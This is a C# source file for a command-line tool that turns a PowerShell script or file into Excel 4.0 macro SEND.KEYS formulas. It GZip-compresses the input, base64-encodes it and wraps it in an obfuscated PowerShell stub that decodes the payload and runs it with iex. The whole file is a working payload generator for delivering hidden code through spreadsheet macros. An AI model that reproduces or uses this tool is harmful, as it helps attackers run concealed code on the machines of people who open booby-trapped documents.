using System;
using System.Linq;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;

namespace ComputePayload
{
    internal static class Program
    {
        // These characters must be enclosed in braces for SEND.KEYS
        private static readonly char[] BadChars = { '+', '^', '%', '~', '(', ')', '[', ']', '{', '}' };

        // The macro breaks if more than 255 characters are sent with SEND.KEYS
        private const int CharLimit = 255;

        // The part of the PowerShell script that extracts the
        // GZip and decodes the base64 to run the payload
        private const string Converter =
            ";nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()";

        // SEND.KEYS turns numlock off, turn it
        // back on since most people have it
        // like that. Tilde is the ENTER key
        private const string Enter = "~{NUMLOCK}";

        // The separator used for formulas by Excel
        private const char FormulaSeparator = ';';

        /// <summary>
        /// Loops through a given string and
        /// encloses all bad chars in braces
        /// and doubles quotes for SEND.KEYS
        /// </summary>
        /// <param name="text"></param>
        /// <returns></returns>
        private static string FixBadChars(string text)
        {
            for (var i = text.Length - 1; i >= 0; --i)
            {
                if (text[i] == '"')
                    text = text.Substring(0, i) + text[i] + "\"" + text.Substring(i + 1);
                else if (BadChars.Any(x => x == text[i]))
                    text = text.Substring(0, i) + "{" + text[i] + "}" + text.Substring(i + 1);
            }

            return text;
        }

        /// <summary>
        /// Compresses the given data
        /// using GZip compression
        /// </summary>
        /// <param name="data"></param>
        /// <returns></returns>
        private static byte[] Compress(byte[] data)
        {
            var compressedData = new MemoryStream();
            using (var compressionStream = new GZipStream(compressedData, CompressionMode.Compress))
            {
                compressionStream.Write(data, 0, data.Length);
            }

            return compressedData.ToArray();
        }

        /// <summary>
        /// Returns a Base64 encoded
        /// string of the given data
        /// </summary>
        /// <param name="data"></param>
        /// <returns></returns>
        private static string Encode(byte[] data)
        {
            return Convert.ToBase64String(data);
        }

        /// <summary>
        /// Splits the given base64 string
        /// into valid Excel 4.0 Macro
        /// commands containing the payload
        /// </summary>
        /// <param name="code"></param>
        /// <param name="useClipboard"></param>
        private static void ComputePayload(string code, bool useClipboard)
        {
            int k = 0, i = -1;
            var lastLine = false;
            // Split the code into @CharLimit chunks
            var splitCode = code.ToLookup(c => Math.Floor(k++ / (double)CharLimit)).Select(e => new string(e.ToArray()));
            // Convert the split code into an array of strings
            var lines = splitCode as string[] ?? splitCode.ToArray();

            if (useClipboard) Clipboard.Clear();
            while (++i < lines.Length)
            {
                var line = lines[i];

                // Check if the current line is over the character
                // limit or if there are any bad characters near the
                // end of the formula. Those need to be moved over to
                // the next formula to make sure the payload doesn't break
                if (line.Length > CharLimit || (line.Length == CharLimit && (BadChars.Any(x => x == line[line.Length - 1]) || line[line.Length - 1] == '"')))
                {
                    // We need to resize the array if we're on the
                    // last line and somehow over the character limit
                    if (i == lines.Length - 1 && line.Length > CharLimit)
                    {
                        Array.Resize(ref lines, lines.Length + 1);
                        lines[lines.Length - 1] = string.Empty;
                    }

                    // We should never be on the last line when
                    // running this, the previous part sorts
                    // it out when necessary, always resulting
                    // in us being on the second to last line
                    if (i < lines.Length - 1)
                    {
                        // Count the bad characters and the amount
                        // we are currently over the character limit
                        var count = 0;
                        for (var j = line.Length - 1; j >= 0; --j)
                        {
                            if (line.Length - count > CharLimit || BadChars.Any(x => x == line[j]) || line[j] == '"')
                                count++;
                            else
                                break;
                        }

                        // Move the counted characters over to the next line
                        lines[i + 1] = line.Substring(line.Length - count) + lines[i + 1];
                        line = line.Substring(0, line.Length - count);
                    }
                }

                // Add the enter command to the last formula 
                if (i == lines.Length - 1 && !lastLine)
                {
                    lastLine = true;

                    // If there's enough room on the
                    // current formula, add it here
                    // otherwise, resize the array
                    if (CharLimit - line.Length >= Enter.Length)
                        line += Enter;
                    else
                    {
                        Array.Resize(ref lines, lines.Length + 1);
                        lines[lines.Length - 1] = Enter;
                    }
                }

                // Compute the formula
                var command = $"=SEND.KEYS(\"{line}\"{FormulaSeparator} TRUE)";

                if (useClipboard)
                    Clipboard.SetText(Clipboard.GetText() + command + Environment.NewLine);

                Console.WriteLine(command);
            }
            if (useClipboard)
                Clipboard.SetText(Clipboard.GetText().TrimEnd('\r', '\n'));
        }

        /// <summary>
        /// Prints the help page
        /// </summary>
        private static void PrintHelp()
        {
            Console.WriteLine($"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name.ToLower()} [OPTION]... [FILE]... [-C]");
            Console.WriteLine("  -e    Compress a file using GZip and encode it into a base64 string");
            Console.WriteLine("  -f    Fix the bad characters in a file (use on one-liners)");
            Console.WriteLine("  -c    Copy the commands into the clipboard instead of displaying them");
        }

        /// <summary>
        /// Runs when the binary is executed
        /// </summary>
        /// <param name="args"></param>
        [STAThread]
        private static void Main(string[] args)
        {
            if (args.Length < 2 || args[0].ToLower() == "-h")
            {
                PrintHelp();
                return;
            }

            var useClipboard = args.Length > 2 && args[2].ToLower() == "-c";
            string code;
            switch (args[0].ToLower())
            {
                case "-e":
                    code = FixBadChars("$b=\"" + Encode(Compress(File.ReadAllBytes(args[1]))) + "\"" + Converter);
                    ComputePayload(code, useClipboard);
                    break;
                case "-f":
                    code = FixBadChars(File.ReadAllText(args[1]).TrimEnd('\r', '\n'));
                    ComputePayload(code, useClipboard);
                    break;
                default:
                    PrintHelp();
                    break;
            }
        }
    }
}
